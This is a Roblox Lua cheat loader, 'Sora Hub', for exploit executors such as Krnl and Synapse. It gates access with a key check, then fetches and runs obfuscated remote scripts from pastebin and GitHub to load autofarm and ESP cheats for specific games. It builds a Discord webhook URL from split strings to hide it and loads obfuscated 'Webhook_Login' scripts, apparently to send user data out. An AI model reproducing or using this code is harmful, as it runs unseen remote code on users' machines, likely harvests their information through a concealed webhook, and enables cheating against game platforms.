local key = loadstring(game:HttpGet("https://pastebin.com/raw/Ab3e8maX"))()
getgenv().webhooklink = "https://dis".."cord.com/api/webh".."ooks/1091470199".."280119899/5Ul_cv".."9LsAUCFZKztqXCXsE7xupzjGTXH4cPt_aN3G".."OSitDFSYNotTXO4RKAo7TVcYAs"
getgenv().executor = ""

function identifyexploit() -- Should Supports: Synapse, Script-Ware, Krnl, Sentinel, SirHurt, Protosmasher
	local ieSuccess, ieResult = pcall(identifyexecutor)
	if ieSuccess then 
		return ieResult 
	end
	
	return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

function begin_krnl()
	rconsoleclear()
	rconsolename("Sora Hub Krnl Key System")
	rconsoleprint("@@LIGHT_CYAN@@")
	rconsoleprint("_________________________________________________________________\n\n.d8888.  .d88b.  d8888b.  .d8b.       db   db db    db d8888b. \n88'  YP .8P  Y8. 88  `8D d8' `8b      88   88 88    88 88  `8D \n`8bo.   88    88 88oobY' 88ooo88      88ooo88 88    88 88oooY' \n  `Y8b. 88    88 88`8b   88~~~88      88~~~88 88    88 88~~~b. \ndb   8D `8b  d8' 88 `88. 88   88      88   88 88b  d88 88   8D \n`8888Y'  `Y88P'  88   YD YP   YP      YP   YP ~Y8888P' Y8888P' \n\n_________________________________________________________________\n\n")
	rconsoleinfo("Get Key: https://pastebin.com/raw/9DgdvFtm")
	rconsoleprint('@@LIGHT_CYAN@@')
	rconsoleprint("Enter Key: ")
	local input = rconsoleinput()

	if input == key then
		rconsoleinfo("Correct Key!")
		rconsoleinfo("Loading...")
		wait(2)
		rconsoleclose()
		SoraHub()
	else
		rconsoleclear()
		rconsoleprint("@@LIGHT_CYAN@@")
		rconsoleprint("_________________________________________________________________\n\n.d8888.  .d88b.  d8888b.  .d8b.       db   db db    db d8888b. \n88'  YP .8P  Y8. 88  `8D d8' `8b      88   88 88    88 88  `8D \n`8bo.   88    88 88oobY' 88ooo88      88ooo88 88    88 88oooY' \n  `Y8b. 88    88 88`8b   88~~~88      88~~~88 88    88 88~~~b. \ndb   8D `8b  d8' 88 `88. 88   88      88   88 88b  d88 88   8D \n`8888Y'  `Y88P'  88   YD YP   YP      YP   YP ~Y8888P' Y8888P' \n\n_________________________________________________________________\n\n")
		rconsoleprint("@@LIGHT_RED@@")
		rconsoleprint("Incorrect Key!")
		wait(1.5)
		rconsoleclear()
		begin_krnl()
	end
end

function begin_syn()
	rconsoleclear()
	rconsolename("Sora Hub Synapse Key System")
	rconsoleprint("@@LIGHT_CYAN@@")
	rconsoleprint("_________________________________________________________________\n\n.d8888.  .d88b.  d8888b.  .d8b.       db   db db    db d8888b. \n88'  YP .8P  Y8. 88  `8D d8' `8b      88   88 88    88 88  `8D \n`8bo.   88    88 88oobY' 88ooo88      88ooo88 88    88 88oooY' \n  `Y8b. 88    88 88`8b   88~~~88      88~~~88 88    88 88~~~b. \ndb   8D `8b  d8' 88 `88. 88   88      88   88 88b  d88 88   8D \n`8888Y'  `Y88P'  88   YD YP   YP      YP   YP ~Y8888P' Y8888P' \n\n_________________________________________________________________\n\n")
	rconsoleinfo("Get Key: https://pastebin.com/raw/9DgdvFtm")
	rconsoleinfo("Do not close this window , doing so will close ur game. Synapse doesnt have 'rconsoleclose()' so yea rip synapse users")
	rconsoleprint('@@LIGHT_CYAN@@')
	rconsoleprint("Enter Key: ")
	local input = rconsoleinput()

	if input == key then
		rconsoleinfo("Correct Key!")
		rconsoleinfo("Loading...")
		wait(2)
		rconsoleclose()
		SoraHub()
	else
		rconsoleclear()
		rconsoleprint("@@LIGHT_CYAN@@")
		rconsoleprint("_________________________________________________________________\n\n.d8888.  .d88b.  d8888b.  .d8b.       db   db db    db d8888b. \n88'  YP .8P  Y8. 88  `8D d8' `8b      88   88 88    88 88  `8D \n`8bo.   88    88 88oobY' 88ooo88      88ooo88 88    88 88oooY' \n  `Y8b. 88    88 88`8b   88~~~88      88~~~88 88    88 88~~~b. \ndb   8D `8b  d8' 88 `88. 88   88      88   88 88b  d88 88   8D \n`8888Y'  `Y88P'  88   YD YP   YP      YP   YP ~Y8888P' Y8888P' \n\n_________________________________________________________________\n\n")
		rconsoleprint("@@LIGHT_RED@@")
		rconsoleprint("Incorrect Key!")
		wait(1.5)
		rconsoleclear()
		begin_syn()
	end
end


function SoraHub()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Webhook_Hub_Obfuscated.lua"))()
	if game.PlaceId == 8884433153 then -- Collect all pets

		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Collect_the_Pets_Obfuscated.lua"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Game Found!", -- Required
			Text = "Sora Hub - Collect All Pets!", -- Required
			Icon = "rbxassetid://12935510321", -- Optional
			Duration = 5
		})

	elseif game.PlaceId == 11819744486 then -- Monster Merge Simulator

		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Monster_Merge_Simulator_Obfuscated.lua"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Game Found!", -- Required
			Text = "Sora Hub - Monster Merge Simulator!", -- Required
			Icon = "rbxassetid://12935509176", -- Optional
			Duration = 5
		})

	elseif game.PlaceId == 10549069562 then -- Weapon Crafting Simulator

		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Weapon_Crafting_Simulator_Obfuscated.lua"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Game Found!", -- Required
			Text = "Sora Hub - Weapon Crafting Simulator!", -- Required
			Icon = "rbxassetid://12935455887", -- Optional
			Duration = 5
		})

	elseif game.PlaceId == 12289293395 then -- Boxing Fighters Simulator

		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Boxing_Fighters_Simulator_Obfuscated.lua"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Game Found! AUTOFARM PATCHED!!", -- Required
			Text = "Sora Hub - Boxing Fighters Simulator", -- Required
			Icon = "rbxassetid://12935455887", -- Optional
			Duration = 5
		})

	elseif game.PlaceId == 12402669933 then -- Apocalypse Tycoon

		loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Apocalypse_Tycoon_Obfuscated.lua"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Game Found!", -- Required
			Text = "Sora Hub - Apocalypse Tycoon", -- Required
			Icon = "rbxassetid://12935455887", -- Optional
			Duration = 5
		})

	else -- Unnamed Esp

		loadstring(game:HttpGet("https://pastebin.com/raw/n4VDYyrP"))()

		game:GetService("StarterGui"):SetCore("SendNotification",{ -- Unnamed ESP
			Title = "Game Not Found", -- Required
			Text = "Unnamed Esp Running", -- Required
			Icon = "rbxassetid://12935455887", -- Optional
			Duration = 5
		})

	end
end

if identifyexploit() == "Krnl" then
	getgenv().executor = "Krnl"
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Webhook_Login_Krnl_Obfuscated.lua"))()
	begin_krnl() -- krnl code
elseif syn then	
	getgenv().executor = "Synapse"
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub_Public/main/SoraHub_Webhook_Login_Synapse_Obfuscated.lua"))()
	begin_syn() -- syn code
else
	print("\nUnsupported Exploit :/ \nUse Krnl , its free + Supports lots of powerful scripts ")
end